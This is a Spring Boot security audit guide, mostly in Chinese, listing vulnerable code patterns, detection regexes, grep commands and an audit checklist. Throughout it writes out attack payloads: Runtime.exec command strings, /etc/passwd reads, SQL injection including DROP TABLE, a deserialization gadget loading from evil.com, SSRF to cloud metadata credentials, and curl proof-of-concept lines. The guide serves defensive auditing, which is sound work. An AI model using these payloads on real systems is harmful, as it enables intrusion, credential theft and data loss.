# Spring Boot Security Audit Guide

> Spring Framework 和 Spring Boot 安全审计模块
> 适用于: Spring Boot 2.x/3.x, Spring MVC, Spring Security, Spring Data

## SpEL 表达式注入检测

```java
// 高危函数和注解
@Value("#{user.input}")              // SpEL表达式注入
parser.parseExpression(userInput)    // 直接解析用户输入
new SpelExpressionParser()           // 注意其使用场景

// 常见漏洞场景
@RequestMapping("/user")
public String getUser(@RequestParam String name) {
    ExpressionParser parser = new SpelExpressionParser();
    Expression exp = parser.parseExpression(name);  // Critical: SpEL注入
    return exp.getValue().toString();
}

// 攻击载荷
GET /user?name=T(java.lang.Runtime).getRuntime().exec("calc")
GET /user?name=new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\Z").next()

// 审计正则
@Value\s*\(.*#\{.*\}.*\)|SpelExpressionParser|parseExpression\s*\(
StandardEvaluationContext
```

---

## Spring Cloud Gateway 漏洞

```yaml
# CVE-2022-22947 - Spring Cloud Gateway Actuator 远程代码执行
# 危险配置
management:
  endpoint:
    gateway:
      enabled: true  # 启用网关actuator

spring:
  cloud:
    gateway:
      actuator:
        verbose:
          enabled: true  # 详细模式

# 攻击向量
POST /actuator/gateway/routes/test HTTP/1.1
Content-Type: application/json

{
  "id": "test",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(java.lang.Runtime).getRuntime().exec('calc')}"
    }
  }],
  "uri": "http://example.com"
}
```

---

## Spring Actuator 信息泄露

```yaml
# 危险配置
management:
  endpoints:
    web:
      exposure:
        include: "*"     # 暴露所有端点
  endpoint:
    env:
      show-values: ALWAYS  # 显示敏感环境变量

# 危险端点清单
/actuator/env            # 环境变量 (含密码)
/actuator/heapdump       # 堆转储 (含内存中的密钥)
/actuator/trace          # HTTP跟踪 (含请求参数)
/actuator/mappings       # 路由映射
/actuator/beans          # Bean配置
/actuator/configprops    # 配置属性

# 审计检查
grep -r "management.endpoints.web.exposure.include" .
grep -r "management.security.enabled.*false" .
```

---

## SQL/HQL 注入检测

```java
// 危险操作 - JPA
@Query(value = "SELECT * FROM users WHERE name = " + name)  // Critical
List<User> findByName(String name);

// 危险操作 - EntityManager
String query = "SELECT u FROM User u WHERE name = '" + name + "'";
entityManager.createQuery(query);  // Critical: HQL注入

// 危险操作 - JdbcTemplate
jdbcTemplate.query("SELECT * FROM users WHERE id = " + id);  // Critical

// 审计正则
@Query.*\+\s*[a-zA-Z]|createQuery\s*\(.*\+|jdbcTemplate\.(query|update).*\+
String.*=.*"SELECT.*\+

// 漏洞示例
@GetMapping("/user")
public User getUser(@RequestParam String id) {
    String sql = "SELECT * FROM users WHERE id = " + id;
    return jdbcTemplate.queryForObject(sql, User.class);
}

// 攻击载荷
GET /user?id=1' OR '1'='1
GET /user?id=1; DROP TABLE users--
```

---

## 不安全的反序列化

```java
// 危险库和配置
Jackson:
enableDefaultTyping()                // 危险配置
@JsonTypeInfo(use = Id.CLASS)        // 允许任意类

XStream:
new XStream()                        // 无白名单
xstream.fromXML(userInput)

// 审计正则
enableDefaultTyping|@JsonTypeInfo.*Id\.CLASS|new\s+XStream\s*\(\)
readObject\s*\(|ObjectInputStream

// 漏洞示例 - Jackson
@PostMapping("/user")
public User createUser(@RequestBody String json) {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();  // Critical: 多态类型处理
    return mapper.readValue(json, User.class);
}

// 攻击载荷
["org.springframework.context.support.ClassPathXmlApplicationContext",
 "http://evil.com/malicious.xml"]
```

---

## 不安全的文件上传

```java
// 危险操作
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();
    file.transferTo(new File("/uploads/" + filename));  // High: 路径遍历
}

// 攻击载荷
POST /upload
Content-Disposition: form-data; name="file"; filename="../../../evil.jsp"

// 审计正则
getOriginalFilename\(\).*transferTo|FileCopyUtils\.copy.*getOriginalFilename
```

---

## SSRF 检测

```java
// 危险操作
RestTemplate restTemplate = new RestTemplate();
String url = request.getParameter("url");
String response = restTemplate.getForObject(url, String.class);  // High: SSRF

// 审计正则
RestTemplate|WebClient|HttpClient.*getParameter|getQueryString
getForObject.*request\.|exchange.*request\.

// 攻击载荷
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /fetch?url=http://localhost:8080/actuator/env
GET /fetch?url=file:///etc/passwd
```

---

## 不安全的 CORS 配置

```java
// 危险配置
registry.addMapping("/**")
    .allowedOrigins("*")       // High: 允许所有域
    .allowCredentials(true);   // 与通配符冲突

// 审计正则
allowedOrigins.*\*|setAllowedOrigins.*\*|allowedOriginPatterns.*\*
allowCredentials.*true
```

---

## 认证和授权绕过

```java
// 危险配置 - permitAll 滥用
http.authorizeRequests()
    .antMatchers("/**").permitAll();  // Critical: 所有路径无需认证

// 危险配置 - CSRF 禁用
http.csrf().disable();  // Medium: 除非API仅供非浏览器客户端

// 危险配置 - 注解绕过
@PreAuthorize("true")  // 无意义的授权检查
@PreAuthorize("hasRole('" + userRole + "')")  // 字符串拼接可能注入

// 漏洞示例: 忘记添加授权注解
@GetMapping("/admin/bypass")  // 忘记添加授权注解
public String adminBypass() {
    return "Admin panel without auth";
}

// 审计正则
permitAll\(\)|csrf\(\)\.disable|@PreAuthorize.*\+
```

---

## Path Traversal in ResourceHttpRequestHandler

```java
// CVE-2018-1271 - Spring MVC 路径遍历
registry.addResourceHandler("/files/**")
    .addResourceLocations("file:/var/www/uploads/");  // 可能路径遍历

// 攻击载荷
GET /files/..%252F..%252Fetc%252Fpasswd

// 审计正则
addResourceLocations.*file:|addResourceHandler.*\*\*
// 安全版本: Spring 5.0.5+ / 4.3.15+
```

---

## XXE 漏洞检测

```java
// 危险操作
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userInputStream);  // High: XXE

SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();  // 默认不安全

// 审计正则
DocumentBuilderFactory\.newInstance|SAXParserFactory\.newInstance|XMLInputFactory\.newInstance

// 攻击载荷
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## 开放重定向检测

```java
// 危险操作
@GetMapping("/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url;  // Medium: 开放重定向
}

// 审计正则
return\s+"redirect:".*request\.|ModelAndView.*"forward:".*request\.

// 攻击载荷
GET /redirect?url=https://evil.com/phishing
```

---

## 敏感信息泄露

```java
// application.properties
spring.jpa.show-sql=true                    // SQL日志
logging.level.root=DEBUG                    // 调试日志
server.error.include-stacktrace=always      // 总是返回堆栈

// 审计正则
printStackTrace|getStackTrace|show-sql=true|include-stacktrace=always
```

---

## JWT 安全检测

```java
// 危险操作
Claims claims = Jwts.parser()
    .parse(jwt)  // High: 不验证签名
    .getBody();

// 弱密钥
String SECRET = "secret";  // Critical: 弱密钥

// none算法
Jwts.builder().setAlgorithm("none");  // Critical

// 审计正则
\.parse\((?!.*setSigningKey)|SECRET.*=.*"[^"]{1,16}"|setAlgorithm.*none
```

---

## 搜索模式汇总

```regex
# SpEL注入
@Value.*#\{|SpelExpressionParser|parseExpression\(

# SQL/HQL注入
@Query.*\+|createQuery.*\+|jdbcTemplate\.(query|update).*\+

# 反序列化
enableDefaultTyping|@JsonTypeInfo.*Id\.CLASS|readObject

# 文件操作
getOriginalFilename|transferTo|FileCopyUtils

# SSRF
RestTemplate|WebClient.*getParameter|getForObject.*request

# Actuator
management\.endpoints.*include.*\*

# 认证授权
permitAll\(\)|csrf\(\)\.disable|@PreAuthorize.*\+

# XXE
DocumentBuilderFactory\.newInstance

# 敏感信息
printStackTrace|getStackTrace|show-sql=true

# 开放重定向
return.*"redirect:".*request|ModelAndView.*"forward:"
```

---

## 快速审计检查清单

```markdown
[ ] 检查 Spring Boot 版本和已知CVE
[ ] 搜索 SpelExpressionParser (SpEL注入)
[ ] 检查 Actuator 端点暴露配置
[ ] 检查 SQL/HQL 查询的字符串拼接
[ ] 搜索 enableDefaultTyping (反序列化)
[ ] 检查文件上传的路径处理
[ ] 检查 RestTemplate/WebClient SSRF
[ ] 检查 CORS 配置 (allowedOrigins)
[ ] 检查认证授权配置 (permitAll)
[ ] 检查 CSRF 是否合理禁用
[ ] 检查 JWT 验证逻辑
[ ] 检查异常处理是否泄露堆栈
[ ] 检查 XXE 防护配置
[ ] 检查开放重定向漏洞
[ ] 审计 application.properties 敏感配置
```

## 最小 PoC 示例
```bash
# SpEL/表达式注入
curl "http://localhost:8080/search?expr=T(java.lang.Runtime).getRuntime().exec('id')"

# SSRF
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"

# 路径遍历下载
curl "http://localhost:8080/common/download?fileName=../../../../etc/passwd"
```

---

## RuoYi 审计经验 (Spring Boot 实战)

### @DataScope 注解风险

```java
// 风险示例：数据范围过滤中的SQL注入
@DataScope(deptAlias = "d")
public List<User> selectUserList(User user) {
    return mapper.selectUserList(user); // 使用${params.dataScope}
}
```

**检测规则:**
```bash
grep -rn "@DataScope" --include="*.java"
grep -rn "\$\{" --include="*.xml"
```

### AOP 切面安全风险

```java
@Aspect
@Component
public class DataScopeAspect {
    // 风险：AOP切面中的SQL拼接
    baseEntity.getParams().put(DATA_SCOPE, " AND (" + sqlString.substring(4) + ")");
}
```

### 导出功能风险

```java
@PostMapping("/export")
public AjaxResult export(User user) {
    List<User> list = userService.selectUserList(user); // 间接调用数据过滤
    return util.exportExcel(list, "用户数据");
}
```

**审计清单补充:**
- [ ] @DataScope 注解驱动的 SQL 注入
- [ ] AOP 切面中的 SQL 拼接风险
- [ ] 导出功能的数据过滤漏洞
- [ ] 权限注解掩盖的安全风险
